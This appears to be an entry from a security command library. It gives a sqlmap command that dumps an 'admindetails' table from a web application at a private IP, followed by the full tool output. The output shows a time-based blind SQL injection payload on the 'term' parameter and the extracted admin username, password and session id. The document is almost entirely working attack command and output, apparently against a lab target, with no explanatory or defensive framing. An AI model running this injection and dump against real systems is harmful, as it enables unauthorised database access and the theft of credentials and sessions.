---
id: eb875a2f-8a08-47a3-8088-caca41a0c909
name: SQLMap Command to Dump Database Contents
type: command
executor: ''
data: sqlmap -u '192.168.43.68/vcart/search.php?term=' -D vulcart -T admindetails
  --dump
output: "        ___\n       __H__\n ___ ___[,]_____ ___ ___  {1.2.7#stable}\n|_ -|\
  \ . [']     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\
  \n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual\
  \ consent is illegal. It is the end user's responsibility to obey all applicable\
  \ local, state and federal laws. Developers assume no liability and are not responsible\
  \ for any misuse or damage caused by this program\n\n[*] starting at 23:30:55\n\n\
  [23:30:55] [WARNING] provided value for parameter 'term' is empty. Please, always\
  \ use only valid parameter values so sqlmap could be able to run properly\n[23:30:55]\
  \ [INFO] resuming back-end DBMS 'mysql' \n[23:30:55] [INFO] testing connection to\
  \ the target URL\nsqlmap got a 302 redirect to 'http://192.168.43.68:80/vcart/login.php'.\
  \ Do you want to follow? [Y/n] y\nsqlmap resumed the following injection point(s)\
  \ from stored session:\n---\nParameter: term (GET)\n    Type: AND/OR time-based\
  \ blind\n    Title: MySQL >= 5.0.12 AND time-based blind\n    Payload: term=%' AND\
  \ SLEEP(5) AND '%'='\n---\n[23:30:58] [INFO] the back-end DBMS is MySQL\nweb application\
  \ technology: Apache 2.4.41, PHP 7.1.32\nback-end DBMS: MySQL >= 5.0.12\n[23:30:58]\
  \ [INFO] fetching columns for table 'admindetails' in database 'vulcart'\n[23:30:58]\
  \ [WARNING] time-based comparison requires larger statistical model, please wait..............................\
  \ (done)                         \n[23:30:59] [WARNING] it is very important to\
  \ not stress the network connection during usage of time-based payloads to prevent\
  \ potential disruptions \ndo you want sqlmap to try to optimize value(s) for DBMS\
  \ delay responses (option '--time-sec')? [Y/n] y\n[23:31:34] [INFO] adjusting time\
  \ delay to 1 second due to good response times\n3\n[23:31:34] [INFO] retrieved:\
  \ username\n[23:32:21] [INFO] retrieved: password\n[23:33:19] [INFO] retrieved:\
  \ sessionid\n[23:34:16] [INFO] fetching entries for table 'admindetails' in database\
  \ 'vulcart'\n[23:34:16] [INFO] fetching number of entries for table 'admindetails'\
  \ in database 'vulcart'\n[23:34:16] [INFO] retrieved: 1\n[23:34:19] [WARNING] (case)\
  \ time-based comparison requires reset of statistical model, please wait..............................\
  \ (done)                \nadmin\n[23:34:52] [INFO] retrieved: wtdf9c7g5ks0l4v\n\
  [23:36:54] [INFO] retrieved: admin\nDatabase: vulcart\nTable: admindetails\n[1 entry]\n\
  +-----------------+----------+----------+\n| sessionid       | username | password\
  \ |\n+-----------------+----------+----------+\n| wtdf9c7g5ks0l4v | admin    | admin\
  \    |\n+-----------------+----------+----------+\n\n[23:37:24] [INFO] table 'vulcart.admindetails'\
  \ dumped to CSV file '/root/.sqlmap/output/192.168.43.68/dump/vulcart/admindetails.csv'\n\
  [23:37:24] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.43.68'\n\
  \n[*] shutting down at 23:37:24\n"
created_at: '2020-08-19T19:04:18.105290+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# SQLMap Command to Dump Database Contents

```bash
sqlmap -u '192.168.43.68/vcart/search.php?term=' -D vulcart -T admindetails --dump
```

## Expected Output

```
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.7#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 23:30:55

[23:30:55] [WARNING] provided value for parameter 'term' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[23:30:55] [INFO] resuming back-end DBMS 'mysql' 
[23:30:55] [INFO] testing connection to the target URL
sqlmap got a 302 redirect to 'http://192.168.43.68:80/vcart/login.php'. Do you want to follow? [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: term (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: term=%' AND SLEEP(5) AND '%'='
---
[23:30:58] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.41, PHP 7.1.32
back-end DBMS: MySQL >= 5.0.12
[23:30:58] [INFO] fetching columns for table 'admindetails' in database 'vulcart'
[23:30:58] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                         
[23:30:59] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[23:31:34] [INFO] adjusting time delay to 1 second due to good response times
3
[23:31:34] [INFO] retrieved: username
[23:32:21] [INFO] retrieved: password
[23:33:19] [INFO] retrieved: sessionid
[23:34:16] [INFO] fetching entries for table 'admindetails' in database 'vulcart'
[23:34:16] [INFO] fetching number of entries for table 'admindetails' in database 'vulcart'
[23:34:16] [INFO] retrieved: 1
[23:34:19] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                
admin
[23:34:52] [INFO] retrieved: wtdf9c7g5ks0l4v
[23:36:54] [INFO] retrieved: admin
Database: vulcart
Table: admindetails
[1 entry]
+-----------------+----------+----------+
| sessionid       | username | password |
+-----------------+----------+----------+
| wtdf9c7g5ks0l4v | admin    | admin    |
+-----------------+----------+----------+

[23:37:24] [INFO] table 'vulcart.admindetails' dumped to CSV file '/root/.sqlmap/output/192.168.43.68/dump/vulcart/admindetails.csv'
[23:37:24] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.43.68'

[*] shutting down at 23:37:24

```
